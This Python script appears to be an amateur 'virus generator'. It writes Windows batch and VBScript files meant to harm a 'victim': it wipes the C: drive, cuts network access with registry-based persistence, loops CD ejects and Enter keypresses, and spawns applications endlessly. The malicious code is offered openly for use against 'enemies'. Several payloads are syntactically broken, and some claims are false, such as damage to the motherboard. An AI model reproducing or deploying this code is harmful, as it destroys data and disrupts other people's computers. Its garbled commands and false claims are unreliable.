import random
import sys
import  os
from time import sleep

def ketik(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 1000)

os.system('clear')


A = """
<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>
<   Project Zer0 Days - We're Making Jell-0-Shots!   >
<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>
"""
print ("")
print(A)

ketik('''
Cooking up a storm for your enemies takes time... ☠️👻

Take this time to thinking about how your going to deploy them to y0ur target...
''')
sleep(0.5)




ketik('''
Creating file with the name : 'RAMx.vbs' causing severeRAM pressure and device suspensi0n.
''')
sleep(0.5)

with open('RAMx.vbs', 'a') as x:
     ss =('''
     
Set oWMP = CreateObject(“WMPlayer.OCX.7”)
Set colCDROMs = oWMP.cdromCollection
do
if colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count – 1
colCDROMs.Item(i).Eject
Next
For i = 0 to colCDROMs.Count – 1
colCDROMs.Item(i).Eject
Next
End If
wscript.sleep 5000
loop
     
     ''')
     ketik(''+ss+'')
     sleep(0.5)
     x.write( ss +'\n')

print('=======================================================')

###############

ketik('''
Creating file with name : 'ip_0ff.bat' Disc0nnect the  victim the internet.
''')
sleep(0.3)
with open('ip_0ff.bat', 'a') as x:
     dd = ('''
@Echo off
Ipconfig /releas
     
     ''')
     ketik(''+dd+'')
     sleep(0.5)
     x.write(  dd + '\n')
    
print('=======================================================')

ketik('''
Creating file with name : 'Del_CDrive.bat'' To delete the victim's C:/ disk.
''')
sleep(0.3)
with open('Del_CDrive.bat', 'a') as x:
     ww = ('''
@Echo off
Del C: *.* |y
     ''')
     ketik(''+ww+'')
     sleep(0.5)
     x.write(  ww + '\n')

print('=======================================================')

ketik('''
Creating file with name : 'Del_Wi-Fi.bat' A computer virus to permanently disable the Internet.
''')
sleep(0.3)
with open('Del_Wi-Fi.bat', 'a') as x:
     pp = ('''
echo @echo off>c:windowswimn32.bat
echo break off>c:windowswimn32.bat echo
ipconfig/release_all>c:windowswimn32.bat
echo end>c:windowswimn32.batreg add
hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
PAUSE
     ''')
     ketik(''+pp+'')
     sleep(0.5)
     x.write(  pp + '\n')

print('=======================================================')

ketik('''
Creating a file with name : 'Enter.bat' This virus will press the 'Enter' key continuously.
''')
sleep(0.3)
with open('Enter.bat', 'a') as x:
     j = ('''
Set wshShell = wscript.CreateObject(”WScript.Shell”)
do
wscript.sleep 100
wshshell.sendkeys “~(enter)”
loop
     ''')
     ketik(''+j+'')
     sleep(0.5)
     x.write(  j + '\n')

print('=======================================================')

ketik('''
Creating a file with name : 'B00m.bat'  This virus severly damages the motherboard. (very dangerous)
''')
sleep(0.3)
with open('B00m.bat', 'a') as x:
     yt = ('''
@echo off
x
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
goto x
     ''')
     ketik(''+yt+'')
     sleep(0.5)
     x.write(  yt + '\n')
